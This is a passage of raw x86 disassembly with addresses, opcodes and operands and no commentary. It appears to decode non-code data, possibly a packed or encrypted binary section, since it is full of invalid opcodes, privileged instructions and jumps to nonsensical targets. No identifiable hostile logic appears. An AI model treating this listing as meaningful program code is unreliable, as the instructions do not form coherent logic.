  4120e5:	rcl    DWORD PTR [ecx+ebx*1],cl
  4120e8:	mov    cl,0xc5
  4120ea:	cld    
  4120eb:	pop    edi
  4120ec:	data16 fbld TBYTE PTR [edi+0x7e]
  4120f0:	hlt    
  4120f1:	dec    ebp
  4120f2:	xchg   ebp,edi
  4120f4:	dec    edi
  4120f5:	stc    
  4120f6:	add    ecx,ebx
  4120f8:	add    edx,DWORD PTR [edi+0x4888208f]
  4120fe:	xor    al,0xfb
  412100:	mov    dl,0x6
  412102:	js     0x4120c4
  412104:	and    esp,DWORD PTR [esi]
  412106:	sub    eax,0xe3bd0a2a
  41210b:	dec    edi
  41210c:	shl    BYTE PTR [ecx+eax*1],0x80
  412110:	cmp    DWORD PTR [eax],eax
  412112:	ffree  st(7)
  412114:	or     ebp,DWORD PTR [ebp+0x5ec29f73]
  41211a:	mov    bh,0x69
  41211c:	test   eax,0x7d0b42a4
  412121:	ins    BYTE PTR es:[edi],dx
  412122:	popa   
  412123:	sub    eax,0xd56c7ba3
  412128:	daa    
  412129:	push   edi
  41212a:	xchg   ecx,eax
  41212b:	fdiv   QWORD PTR [esi]
  41212d:	test   DWORD PTR [ebx-0x68],ebx
  412130:	mov    ecx,0xc2aa64c3
  412135:	retf   0x60a5
  412138:	sub    ebx,DWORD PTR [edx-0x77]
  41213b:	jae    0x412154
  41213d:	mov    edi,0x44235470
  412142:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412143:	pop    esi
  412144:	inc    BYTE PTR [ecx]
  412146:	pop    eax
  412147:	nop
  412148:	nop
  412149:	add    DWORD PTR [eax-0x2d],esp
  41214c:	aas    
  41214d:	adc    ebp,DWORD PTR [edi+0x6206fe65]
  412153:	xor    al,BYTE PTR [ecx]
  412155:	push   0x892bb08c
  41215a:	clc    
  41215b:	fwait
  41215c:	stos   BYTE PTR es:[edi],al
  41215d:	scas   al,BYTE PTR es:[edi]
  41215e:	xchg   edi,eax
  41215f:	hlt    
  412160:	mov    ch,0x3
  412162:	retf   
  412163:	mov    ds:0x9aa1d3e1,eax
  412168:	inc    esi
  412169:	jne    0x4121c5
  41216b:	mov    ds:0x3b42a8b3,al
  412170:	push   esi
  412171:	xor    ecx,DWORD PTR [edx]
  412173:	fst    QWORD PTR [edi-0x19]
  412176:	jb     0x41213e
  412178:	repnz loopne 0x4121be
  41217b:	mov    edx,0x2c1343ed
  412180:	pushf  
  412181:	ficom  DWORD PTR [ecx+ebp*1-0x1e]
  412185:	and    DWORD PTR [ebx-0x3fe3a66b],0xd31c6adb
  41218f:	clc    
  412190:	leave  
  412191:	and    DWORD PTR [ebx-0x4d71c057],edx
  412197:	ins    DWORD PTR es:[edi],dx
  412198:	jp     0x4121e4
  41219a:	inc    edi
  41219b:	add    eax,0x3fd1b49f
  4121a0:	fidiv  WORD PTR [edi-0x5fe58e3f]
  4121a6:	mov    DWORD PTR [edi],ecx
  4121a8:	jle    0x4121b3
  4121aa:	jb     0x4121b0
  4121ac:	or     eax,0x83218ba3
  4121b1:	imul   esi,DWORD PTR [esi+0x21],0xfffffff6
  4121b5:	xlat   BYTE PTR ds:[ebx]
  4121b6:	push   esi
  4121b7:	jb     0x4121ac
  4121b9:	ss (bad) 
  4121bb:	ds xchg esi,eax
  4121bd:	lea    edx,[eax-0x15108c26]
  4121c3:	dec    edx
  4121c4:	push   edx
  4121c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121c6:	(bad)
  4121c9:	loopne 0x412240
  4121cb:	ffree  st(5)
  4121cd:	jnp    0x41220f
  4121cf:	pop    edi
  4121d0:	xchg   ebp,eax
  4121d1:	stos   DWORD PTR es:[edi],eax
  4121d2:	xor    dl,BYTE PTR [edx]
  4121d4:	dec    ecx
  4121d5:	shl    BYTE PTR [ebx+0x51],cl
  4121d8:	loopne 0x412187
  4121da:	(bad)
  4121dd:	imul   esi,DWORD PTR [edx],0x4aa628f1
  4121e3:	stc    
  4121e4:	aad    0x58
  4121e6:	cmp    ch,BYTE PTR [ebx+0x6a]
  4121e9:	jnp    0x4121ab
  4121eb:	in     eax,0x41
  4121ed:	je     0x412254
  4121ef:	not    ah
  4121f1:	retf   0x7fd7
  4121f4:	ret    
  4121f5:	mov    al,0x35
  4121f7:	pushf  
  4121f8:	or     eax,0x2af88dc1
  4121fd:	das    
  4121fe:	add    eax,0x520a8c1c
  412203:	sbb    DWORD PTR [edx+ebx*1-0x6a0764b7],ebp
  41220a:	sbb    edi,DWORD PTR [eax+0x24]
  41220d:	sub    BYTE PTR [edi+0x75d417e7],cl
  412213:	xchg   DWORD PTR [esi],edi
  412215:	dec    ebx
  412216:	jg     0x4121b4
  412218:	out    dx,al
  412219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41221a:	xor    BYTE PTR [edi],ch
  41221c:	push   edx
  41221d:	add    esp,DWORD PTR [ebp-0x496b28c3]
  412223:	jo     0x412296
  412225:	imul   DWORD PTR [eax+0x28205435]
  41222b:	test   al,0x95
  41222d:	xchg   ebp,eax
  41222e:	jg     0x41226d
  412230:	pop    ss
  412231:	loopne 0x41228f
  412233:	fst    QWORD PTR [eax+0x15]
  412236:	leave  
  412237:	push   ebx
  412238:	ret    
  412239:	ficom  DWORD PTR [esi-0x294e1479]
  41223f:	icebp  
  412240:	scas   al,BYTE PTR es:[edi]
  412241:	aam    0xe2
  412243:	adc    dl,dh
  412245:	mov    ch,BYTE PTR [ebp-0x278ed15e]
  41224b:	sub    eax,0x438f2468
  412250:	shl    edx,0x69
  412253:	jbe    0x41222a
  412255:	jmp    0x67732536
  41225a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41225b:	mov    bh,0xa2
  41225d:	rcr    cl,0xe2
  412260:	(bad)  
  412261:	enter  0x91d7,0x46
  412265:	mov    ecx,0xc375aef1
  41226a:	(bad)  
  41226c:	rol    DWORD PTR [eax-0x42],1
  41226f:	dec    ebx
  412270:	cmp    esp,DWORD PTR [edx-0x10753cca]
  412276:	dec    esi
  412277:	sti    
  412278:	cmp    DWORD PTR [ebp-0x9],edi
  41227b:	cmp    eax,0xcff9bd61
  412280:	inc    esp
  412281:	dec    ecx
  412282:	repz leave 
  412284:	inc    ecx
  412285:	push   edi
  412286:	mov    eax,ds:0x9c4010f7
  41228b:	sub    DWORD PTR [eax],eax
  41228d:	xchg   esi,eax
  41228e:	test   eax,0x8e576f68
  412293:	ds dec esp
  412295:	sub    DWORD PTR [eax-0x4e],0x84565da1
  41229c:	das    
  41229d:	mov    bh,0xf9
  41229f:	add    BYTE PTR [eax+0x7f92d24d],cl
  4122a5:	xchg   ebx,eax
  4122a6:	bound  edi,QWORD PTR [ebp-0x12]
  4122a9:	jp     0x412255
  4122ab:	pop    ebp
  4122ad:	out    0x4,eax
  4122af:	das    
  4122b0:	mov    DWORD PTR [ecx-0x60b603bc],esp
  4122b6:	xchg   DWORD PTR [eax+0x71],ebp
  4122b9:	dec    ebp
  4122ba:	scas   eax,DWORD PTR es:[edi]
  4122bb:	icebp  
  4122bc:	and    ebp,edx
  4122be:	cmp    BYTE PTR [esi-0x599b55f5],0x1f
  4122c5:	adc    bh,BYTE PTR [ecx+eax*1-0x65661f39]
  4122cc:	aad    0xcf
  4122ce:	ss (bad) 
  4122d0:	pushf  
  4122d1:	icebp  
  4122d2:	inc    edi
  4122d3:	sbb    al,BYTE PTR [esi+0x7f6136eb]
  4122d9:	mov    eax,ds:0xbade7af5
  4122de:	fdivr  QWORD PTR [esi+0x6]
  4122e1:	lods   al,BYTE PTR ds:[esi]
  4122e2:	pop    esp
  4122e3:	dec    esp
  4122e4:	xchg   esp,eax
  4122e5:	js     0x412353
  4122e7:	ins    DWORD PTR es:[edi],dx
  4122e8:	jge    0x41227d
  4122ea:	mov    ch,0x3
  4122ec:	pop    ebx
  4122ed:	scas   eax,DWORD PTR es:[edi]
  4122ee:	mov    al,0x50
  4122f0:	mov    edi,0x213779e4
  4122f5:	mov    eax,0xafaec681
  4122fa:	and    DWORD PTR ds:0xf952ee8e,0x2a35a7c8
  412304:	cmp    DWORD PTR [ebp-0x1f],0xffffffe6
  412308:	(bad)  
  412309:	push   ebp
  41230a:	cdq    
  41230b:	xor    al,0x65
  41230d:	xchg   esi,eax
  41230e:	jecxz  0x41232a
  412310:	pusha  
  412311:	test   DWORD PTR ds:0x884749d3,ebx
  412317:	test   eax,0x61d3da03
  41231c:	fidiv  DWORD PTR [edi+0x76cd8215]
  412322:	or     DWORD PTR [ecx+0x39],esi
  412325:	test   eax,0xe2cd37f1
  41232a:	and    al,dl
  41232c:	(bad)  
  41232d:	iret   
  41232e:	inc    edx
  41232f:	jb     0x41238a
  412331:	mov    bh,0xe1
  412333:	aas    
  412334:	mov    dh,0x62
  412336:	adc    cl,BYTE PTR [edx-0x31]
  412339:	adc    BYTE PTR [eax+0x598656b0],ah
  41233f:	jecxz  0x412340
  412341:	pop    eax
  412342:	pop    eax
  412343:	and    eax,0xddff7cd1
  412348:	ret    
  412349:	dec    ecx
  41234a:	nop
  41234b:	sub    DWORD PTR [edi],eax
  41234d:	pop    ebp
  41234e:	clc    
  41234f:	(bad)  
  412350:	sub    ah,BYTE PTR [ebx]
  412352:	addr16 clc 
  412354:	jae    0x41233f
  412356:	aas    
  412357:	xchg   ebx,eax
  412358:	test   DWORD PTR ds:0xfe514d8,eax
  41235e:	nop    esi
  412361:	int    0x3
  412363:	dec    ebx
  412364:	ror    BYTE PTR [edx+0x4548dc54],cl
  41236a:	xchg   ebx,eax
  41236b:	jmp    0x412398
  41236d:	xor    DWORD PTR [eax],ebp
  41236f:	lods   eax,DWORD PTR ds:[esi]
  412370:	add    ecx,DWORD PTR [esi]
  412372:	inc    ebx
  412373:	push   ss
  412374:	aaa    
  412375:	push   esp
  412376:	stos   DWORD PTR es:[edi],eax
  412377:	cmp    ebx,ecx
  412379:	xor    BYTE PTR [edi],al
  41237b:	jle    0x4123c4
  41237d:	out    dx,al
  41237e:	jnp    0x412385
  412380:	push   ss
  412381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412382:	loop   0x412310
  412384:	inc    eax
  412385:	mov    esi,0x714c9113
  41238a:	adc    esp,DWORD PTR [eax-0x27]
  41238d:	or     eax,0x5f9e43eb
  412392:	pop    ss
  412393:	dec    esp
  412394:	pop    ss
  412395:	jl     0x4123a3
  412397:	ins    BYTE PTR es:[edi],dx
  412398:	int    0x97
  41239a:	pushf  
  41239b:	pop    ds
  41239c:	or     BYTE PTR [ecx+ebx*1+0x2a],bh
  4123a0:	push   ecx
  4123a1:	(bad)  
  4123a2:	dec    ebx
  4123a3:	repnz cmp bh,BYTE PTR [ebx]
  4123a6:	inc    ebp
  4123a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123a8:	hlt    
  4123a9:	lods   eax,DWORD PTR ds:[esi]
  4123aa:	mov    eax,0x694fc3b8
  4123af:	cmp    BYTE PTR [ebx-0x3d736979],dl
  4123b5:	test   BYTE PTR fs:[edi-0x2f],0x20
  4123ba:	shl    cl,0x6b
  4123bd:	jns    0x4123ef
  4123bf:	addr16 call 0xe5e3df7a
  4123c5:	rcr    dh,cl
  4123c7:	aas    
  4123c8:	pop    ds
  4123c9:	jb     0x412420
  4123cb:	mov    eax,ds:0x777c3e81
  4123d0:	mov    ch,0x7e
  4123d2:	fbld   TBYTE PTR [ecx]
  4123d4:	xor    al,bl
  4123d6:	xchg   edx,eax
  4123d7:	sub    ch,BYTE PTR [eax+esi*2+0x356c2c0f]
  4123de:	lods   eax,DWORD PTR ds:[esi]
  4123df:	retf   
  4123e0:	xor    cl,al
  4123e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123e3:	and    esi,ebp
  4123e5:	dec    esi
  4123e6:	test   al,0xaa
  4123e8:	cmp    dl,BYTE PTR [eax+0x16]
  4123eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123ec:	cmc    
  4123ed:	cmp    esp,DWORD PTR [ebp-0x6c3bd0cf]
  4123f3:	imul   BYTE PTR [edi]
  4123f5:	in     al,0x24
  4123f7:	jmp    0x6028:0x7b930695
  4123fe:	fs loopne 0x4123ef
  412401:	mov    ebp,0xf89b18d9
  412406:	or     ebx,0xffffffc4
  412409:	js     0x4123e3
  41240b:	enter  0x262b,0xa2
  41240f:	jg     0x4123c9
  412411:	xchg   ecx,eax
  412412:	sbb    ecx,DWORD PTR [esi]
  412414:	jge    0x41242c
  412416:	addr16 adc ax,0x6c73
  41241b:	inc    esp
  41241c:	clc    
  41241d:	add    esi,DWORD PTR [esi-0x5c]
  412420:	inc    esp
  412421:	sub    dl,BYTE PTR [ebp+0x3d]
  412424:	push   cs
  412425:	in     al,0x17
  412427:	ficom  WORD PTR [edx+ecx*4+0x194c37e9]
  41242e:	test   BYTE PTR [ebp+0x12e7fe05],0x7e
  412435:	pop    edx
  412436:	iret   
  412437:	adc    eax,0x4541ed52
  41243c:	xor    BYTE PTR [ebp+0x2f],dl
  41243f:	jne    0x41246f
  412441:	adc    DWORD PTR [esi],edi
  412443:	pop    es
  412444:	inc    ebx
  412445:	xor    DWORD PTR [eax-0x25],edx
  412448:	or     bl,BYTE PTR [ecx+0x49ec0cf3]
  41244e:	(bad)  [eax]
  412450:	mov    ds:0xeeb9e618,al
  412455:	je     0x412408
  412457:	call   0xa299aeb1
  41245c:	sti    
  41245d:	sub    BYTE PTR [esp+ebp*8],ah
  412460:	cli    
  412461:	mov    al,0x1a
  412463:	adc    BYTE PTR [edx+0x14bf82fe],ch
  412469:	lea    ebx,[ebx]
  41246b:	mov    cl,cl
  41246d:	jge    0x412420
  41246f:	jne    0x4124c5
  412471:	(bad)  
  412472:	adc    al,0x8
  412474:	or     bl,cl
  412476:	and    edx,DWORD PTR [ebx]
  412478:	das    
  412479:	les    ebx,FWORD PTR [eax+0x2be6732]
  41247f:	push   ds
  412480:	mov    ds:0x5acafb2d,al
  412485:	ret    
  412486:	sub    DWORD PTR [ecx+ecx*8+0x23],ecx
  41248a:	add    eax,0x55b8d55
  41248f:	ficomp WORD PTR [edi+0x74]
  412492:	push   cs
  412493:	cmp    ebx,DWORD PTR [ecx]
  412495:	push   ecx
  412496:	jnp    0x41245e
  412498:	pop    ss
  412499:	scas   eax,DWORD PTR es:[edi]
  41249a:	call   0xafcb8ca2
  41249f:	inc    ebp
  4124a0:	pop    edx
  4124a1:	and    BYTE PTR [ebx],dh
  4124a3:	cmp    BYTE PTR [edi+eiz*1+0xe429a2c],0x98
  4124ab:	add    ebp,DWORD PTR [eax-0x21042e40]
  4124b1:	xchg   esi,eax
  4124b2:	lods   eax,DWORD PTR ds:[esi]
  4124b3:	push   es
  4124b4:	cmc    
  4124b5:	mov    BYTE PTR [ebx-0x4aeb7633],al
  4124bb:	rcr    BYTE PTR [ebx-0x36ab5afe],0x7a
  4124c2:	cmp    ebx,edi
  4124c4:	add    bl,BYTE PTR [edx]
  4124c6:	shr    DWORD PTR [esi],0x21
  4124c9:	idiv   BYTE PTR [ecx+0x56]
  4124cc:	xor    BYTE PTR [ecx+0x21858e69],bh
  4124d2:	mov    eax,ds:0xc8e6c892
  4124d7:	mov    ch,0x25
  4124d9:	jecxz  0x4124b0
  4124db:	adc    eax,0x271054be
  4124e0:	pop    ebp
  4124e1:	scas   al,BYTE PTR es:[edi]
  4124e2:	mov    ebp,0xfa50c46a
  4124e7:	mov    ebp,0xd15ac3f5
  4124ec:	push   eax
  4124ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124ee:	nop
  4124ef:	mov    cl,cl
  4124f1:	pop    esi
  4124f2:	aaa    
  4124f3:	das    
  4124f4:	or     bl,BYTE PTR [edi+0x1e8f6bb1]
  4124fa:	ins    DWORD PTR es:[edi],dx
  4124fb:	push   ss
  4124fc:	sub    al,0x48
  4124fe:	sbb    eax,0x2cd59286
  412503:	fnstcw WORD PTR [edx+0x636f81aa]
  412509:	out    dx,al
  41250a:	jns    0x412539
  41250c:	sar    esi,0x45
  41250f:	jmp    0x4124f5
  412511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412512:	and    al,0xf
  412514:	shl    DWORD PTR [esi],cl
  412516:	mov    ecx,0x97942051
  41251b:	mov    esi,0x8138131a
  412520:	xchg   edx,eax
  412521:	jmp    0x8f8d:0xb4b5fe04
  412528:	stos   DWORD PTR es:[edi],eax
  412529:	iret   
  41252a:	add    BYTE PTR ds:0xb563ffb5,0xf1
  412531:	inc    esi
  412532:	sub    BYTE PTR [eax-0x248dc2e9],dh
  412538:	xor    BYTE PTR [edx],0x91
  41253b:	stc    
  41253c:	sbb    eax,0xbc45982f
  412541:	test   DWORD PTR [eax-0x2eef6dfc],eax
  412547:	mov    edi,0x6e0e83d5
  41254c:	gs adc bl,bh
  41254f:	sbb    BYTE PTR [edx+0x35],bl
  412552:	fcomp  DWORD PTR [ebp-0x4693b8df]
  412558:	out    dx,al
  412559:	and    eax,DWORD PTR [ebx]
  41255b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41255c:	pop    eax
  41255d:	mov    ecx,0x9e9f3c0f
  412562:	push   es
  412563:	push   ebx
  412564:	cmp    dh,BYTE PTR [eax-0x586a452a]
  41256a:	repz jbe 0x412588
  41256d:	rcl    DWORD PTR [edi+0x42],1
  412570:	sbb    al,0x70
  412572:	test   BYTE PTR [edx+0x1cba6151],0xfa
  412579:	push   0x5
  41257b:	dec    edi
  41257c:	ret    0x491e
  41257f:	stos   DWORD PTR es:[edi],eax
  412580:	pushf  
  412581:	scas   al,BYTE PTR es:[edi]
  412582:	test   BYTE PTR [ebx],dl
  412584:	jmp    0x91e3:0xf08472f9
  41258b:	mov    ds:0x54b953fb,eax
  412590:	popf   
  412591:	mov    ds,WORD PTR [eax]
  412593:	sbb    al,0xe0
  412595:	pop    ebx
  412596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412597:	mov    al,0x7
  412599:	xchg   ebx,eax
  41259a:	sub    al,0xb9
  41259c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41259d:	test   ecx,ebp
  41259f:	lahf   
  4125a0:	adc    edx,DWORD PTR [esp+edx*1-0x13663650]
  4125a7:	xchg   edi,eax
  4125a8:	mov    ebx,0xad2d2f25
  4125ad:	xor    bl,BYTE PTR [esi-0x46]
  4125b0:	xor    BYTE PTR [esi],ch
  4125b2:	cs ret 
  4125b4:	add    bl,0x5c
  4125b7:	ror    BYTE PTR [ebx-0x58],1
  4125ba:	jle    0x412621
  4125bc:	or     si,WORD PTR [ebx]
  4125bf:	xor    BYTE PTR [edi+eax*8+0x6fc246b],dl
  4125c6:	add    al,0xdd
  4125c8:	daa    
  4125c9:	rcl    BYTE PTR [ebx-0x61c20a20],cl
  4125cf:	cmp    BYTE PTR [ebp+0x56],al
  4125d2:	cmp    ch,al
  4125d4:	ror    dh,1
  4125d6:	lds    ebp,FWORD PTR [edx-0x12c4392d]
  4125dc:	mov    eax,ds:0xee3ea147
  4125e1:	xor    eax,0xa6edd227
  4125e6:	xchg   esi,eax
  4125e7:	clc    
  4125e8:	add    BYTE PTR [esi],al
  4125ea:	retf   0x323d
  4125ed:	inc    esi
  4125ee:	(bad)  
  4125ef:	ret    0x633f
  4125f2:	ins    DWORD PTR es:[edi],dx
  4125f3:	dec    eax
  4125f4:	repnz test DWORD PTR [ebp-0x44],eax
  4125f8:	test   al,0x45
  4125fa:	ins    BYTE PTR es:[edi],dx
  4125fb:	jecxz  0x4125f2
  4125fd:	stc    
  4125fe:	dec    ebx
  4125ff:	add    cl,BYTE PTR [ebp-0x47]
  412602:	outs   dx,BYTE PTR ds:[esi]
  412603:	dec    eax
  412604:	pushf  
  412605:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412606:	out    dx,al
  412607:	bound  ecx,QWORD PTR [esi]
  412609:	in     al,0x83
  41260b:	cwde   
  41260c:	mov    dl,0x6e
  41260e:	call   0x8cfe:0xebb7b62a
  412615:	mov    ebp,ecx
  412617:	repnz push ecx
  412619:	push   ebx
  41261a:	dec    esi
  41261b:	dec    esp
  41261c:	addr16 inc edi
  41261e:	push   es
  41261f:	and    ah,BYTE PTR [ebp+0x78]
  412622:	sbb    ah,dl
  412624:	sbb    DWORD PTR [edi+0x572b57bf],ebp
  41262a:	scas   al,BYTE PTR es:[edi]
  41262b:	dec    bh
  41262d:	retf   0xc3a0
  412630:	clc    
  412631:	scas   al,BYTE PTR es:[edi]
  412632:	test   eax,ecx
  412634:	jo     0x41260f
  412636:	jae    0x4125e3
  412638:	cli    
  412639:	mov    fs,edi
  41263b:	cld    
  41263c:	xor    al,0x89
  41263e:	sbb    ah,dl
  412640:	je     0x41260d
  412642:	add    al,0xd3
  412644:	gs xor al,0x40
  412647:	outs   dx,BYTE PTR ds:[esi]
  412648:	pop    esp
  412649:	shl    esp,0xd9
  41264c:	popf   
  41264d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41264e:	cmp    eax,DWORD PTR [eax+0x7c8680cc]
  412654:	outs   dx,BYTE PTR ds:[esi]
  412655:	adc    esp,DWORD PTR [edx-0x1e]
  412658:	jno    0x412692
  41265a:	test   ebp,ebx
  41265c:	jmp    0x59af7687
  412661:	pop    eax
  412662:	shl    BYTE PTR [esi-0x3b],cl
  412665:	cwde   
  412666:	int3   
  412667:	push   ebx
  412668:	fwait
  412669:	dec    eax
  41266a:	xor    BYTE PTR [edi+eiz*1-0x7f95b2d7],cl
  412671:	into   
  412672:	frstor [ecx-0x1d8b9a48]
  412678:	mov    ebx,DWORD PTR [esi]
  41267a:	pusha  
  41267b:	or     esp,DWORD PTR [eax*1+0x28be957c]
  412682:	xchg   dh,cl
  412684:	jmp    0xfedd9659
  412689:	or     al,0x8f
  41268b:	xor    al,0x4c
  41268d:	scas   al,BYTE PTR es:[edi]
  41268e:	rcr    DWORD PTR [ecx-0x7b74cba2],cl
  412694:	push   esi
  412695:	or     al,0xe2
  412697:	add    esi,DWORD PTR [ebx+0x32]
  41269a:	inc    ebx
  41269b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41269c:	push   esp
  41269d:	imul   ebx,DWORD PTR fs:[edx],0xd8321258
  4126a4:	or     edx,DWORD PTR [eax]
  4126a6:	sbb    ecx,DWORD PTR [ebp-0x1cd7b6fb]
  4126ac:	imul   edx,DWORD PTR [ebx],0x21a95a73
  4126b2:	repnz sti 
  4126b4:	aas    
  4126b5:	(bad)  
  4126b6:	cld    
  4126b7:	aam    0x94
  4126b9:	js     0x412671
  4126bb:	sub    ebx,0x87f54d92
  4126c1:	aaa    
  4126c2:	daa    
  4126c3:	cmp    al,0x61
  4126c6:	dec    ecx
  4126c7:	stos   DWORD PTR es:[edi],eax
  4126c8:	mov    cl,0x5
  4126ca:	dec    BYTE PTR [esi]
  4126cc:	ds push ebp
  4126ce:	sbb    BYTE PTR [eax],bl
  4126d0:	push   ds
  4126d1:	cmp    eax,0xfb6c7ad8
  4126d6:	cmp    edi,0x9a32acd0
  4126dc:	loope  0x412742
  4126de:	cs and cl,dh
  4126e1:	or     al,0xa1
  4126e3:	sbb    BYTE PTR [edi+0x3aa9aac1],bl
  4126e9:	inc    edx
  4126ea:	call   0xa677:0x785f9f43
  4126f1:	and    ebx,DWORD PTR [ecx]
  4126f3:	stos   BYTE PTR es:[edi],al
  4126f4:	push   0x477fd65c
  4126f9:	retf   
  4126fa:	jp     0x41268b
  4126fc:	icebp  
  4126fd:	(bad)  
  4126fe:	jbe    0x4126d4
  412700:	repnz push 0xffffff84
  412703:	sbb    al,0xac
  412705:	jl     0x412718
  412707:	add    DWORD PTR [edi],ebp
  412709:	(bad)  
  41270a:	fst    QWORD PTR [eax+0x56]
  41270d:	mov    ds:0xbce5daaf,eax
  412712:	cmovge esp,DWORD PTR [eax-0x10]
  412716:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412717:	adc    DWORD PTR [esi],0xfd376ccf
  41271d:	xor    DWORD PTR [edi+edx*1+0x7],esi
  412721:	pusha  
  412722:	test   al,0x75
  412724:	jp     0x4126d1
  412726:	dec    esi
  412727:	and    ebx,ecx
  412729:	(bad)  
  41272a:	loope  0x41275a
  41272c:	adc    cl,ah
  41272e:	sub    DWORD PTR [edi+0xb8d80bf],eax
  412734:	push   ecx
  412735:	dec    ecx
  412736:	imul   esp,esi,0x60303659
  41273c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41273d:	xchg   edx,eax
  41273e:	pop    esi
  41273f:	push   edi
  412740:	mov    cl,0x8c
  412742:	sub    esi,DWORD PTR [ecx-0x48]
  412745:	or     ebx,ebp
  412747:	dec    eax
  412748:	es pop ebx
  41274a:	jl     0x41271c
  41274c:	mov    ch,0xc
  41274e:	and    bh,bh
  412750:	jmp    esp
  412752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412753:	es dec ecx
  412755:	cdq    
  412756:	mov    bl,0x3
  412758:	mov    dh,0x2
  41275a:	mov    dh,0x12
  41275c:	mov    WORD PTR [edx+0x1d7d9f95],es
  412762:	jle    0x41275a
  412764:	sbb    al,0xdd
  412766:	push   es
  412767:	shl    DWORD PTR [esi],0x9d
  41276a:	fidiv  DWORD PTR [ecx]
  41276c:	pop    edi
  41276d:	sub    eax,0xfb822941
  412772:	stos   BYTE PTR es:[edi],al
  412773:	inc    ebx
  412774:	(bad)  
  412775:	fbstp  TBYTE PTR [edi]
  412777:	int3   
  412778:	ins    DWORD PTR es:[edi],dx
  412779:	(bad)  
  41277a:	out    0xf6,eax
  41277c:	lds    esi,FWORD PTR [ecx]
  41277e:	or     esp,ebx
  412780:	pop    ebp
  412781:	ss jae 0x412760
  412784:	mov    esp,DWORD PTR [esi]
  412786:	pop    ebx
  412787:	popa   
  412788:	icebp  
  412789:	push   ebx
  41278a:	inc    esp
  41278b:	inc    ebx
  41278c:	adc    DWORD PTR [edi-0x23],ebx
  41278f:	add    eax,0xf3cc4da4
  412794:	or     al,0x5f
  412796:	loopne 0x412735
  412798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412799:	push   ebx
  41279a:	pop    ebp
  41279b:	in     eax,0xb8
  41279d:	sub    dh,BYTE PTR [eax+0x37]
  4127a0:	jno    0x41274b
  4127a2:	push   ebp
  4127a3:	jns    0x41281d
  4127a5:	dec    edx
  4127a6:	pop    edx
  4127a7:	(bad)
  4127ac:	add    dh,bl
  4127ae:	lahf   
  4127af:	push   ebx
  4127b0:	inc    esi
  4127b1:	xchg   DWORD PTR [eax],ecx
  4127b3:	pop    edx
  4127b4:	inc    ebp
  4127b5:	psubusb mm5,QWORD PTR [ebx+0xb05c6f7]
  4127bc:	out    dx,al
  4127bd:	mov    bl,0x35
  4127bf:	out    dx,al
  4127c0:	in     eax,0x3c
  4127c2:	and    BYTE PTR [ecx-0x487f0220],ah
  4127c8:	std    
  4127c9:	xor    bl,BYTE PTR [esi+0x412b99ae]
  4127cf:	sar    BYTE PTR ds:0x11114790,0x4d
  4127d6:	in     eax,dx
  4127d7:	cmp    eax,0x71d6b806
  4127dc:	lods   al,BYTE PTR ds:[esi]
  4127dd:	sub    ah,BYTE PTR [edi-0x4bf1c1b0]
  4127e3:	pop    eax
  4127e4:	xor    ecx,esp
  4127e6:	mov    ah,0xca
  4127e8:	pop    esi
  4127e9:	xor    esp,esi
  4127eb:	test   al,0x7
  4127ed:	shl    ecx,0xa2
  4127f0:	sbb    BYTE PTR [ebx-0x58252ee4],dh
  4127f6:	mov    ds,WORD PTR [ebx-0x1]
  4127f9:	sbb    al,al
  4127fb:	rcr    BYTE PTR [ebx],1
  4127fd:	repnz push ebx
  4127ff:	push   edx
  412800:	adc    DWORD PTR [esi+ebx*8-0x61da7d62],edi
  412807:	xchg   ebx,eax
  412808:	mov    ebp,0x5476a931
  41280d:	fs and eax,0x5ae3451c
  412813:	cli    
  412814:	ror    DWORD PTR ds:0x590a247a,0x3b
  41281b:	push   ebp
  41281c:	sub    ebx,DWORD PTR [ebp+edx*2-0x4c]
  412820:	addr16 mov al,0x39
  412823:	call   0x45d73e65
  412828:	push   ecx
  412829:	neg    DWORD PTR [eax+0x78]
  41282c:	mov    WORD PTR [ecx+ebp*8+0x69],ds
  412830:	xor    BYTE PTR [edx+0x4d32a97c],al
  412836:	mov    BYTE PTR [eax],bh
  412838:	aam    0x32
  41283a:	push   esi
  41283b:	xchg   edx,eax
  41283c:	jmp    0x3a27cb69
  412841:	out    0x10,al
  412843:	add    al,0x58
  412845:	mov    es,WORD PTR [ecx+0x20797196]
  41284b:	pop    esp
  41284c:	into   
  41284d:	ret    0xdf94
  412850:	outs   dx,DWORD PTR ds:[esi]
  412851:	xchg   edi,eax
  412852:	sub    DWORD PTR [esp+esi*2+0x2e5ba271],ecx
  412859:	inc    edx
  41285a:	inc    ebp
  41285b:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41285d:	jae    0x4128b9
  41285f:	xor    al,0xc7
  412861:	mov    ebx,DWORD PTR [eax-0x79701e9a]
  412867:	add    BYTE PTR [ebx-0x55eb4f01],al
  41286d:	in     al,0x85
  41286f:	fabs   
  412871:	jge    0x412833
  412873:	std    
  412874:	mov    ch,0xd3
  412876:	out    dx,al
  412877:	push   cs
  412878:	inc    ebx
  412879:	call   0x22b5:0xb8c36f8c
  412880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412881:	inc    edx
  412882:	jl     0x4128f4
  412884:	loope  0x4128c3
  412886:	stos   BYTE PTR es:[edi],al
  412887:	xchg   ebp,eax
  412888:	loop   0x4128c4
  41288a:	aas    
  41288b:	mov    fs:0x8774a2d3,eax
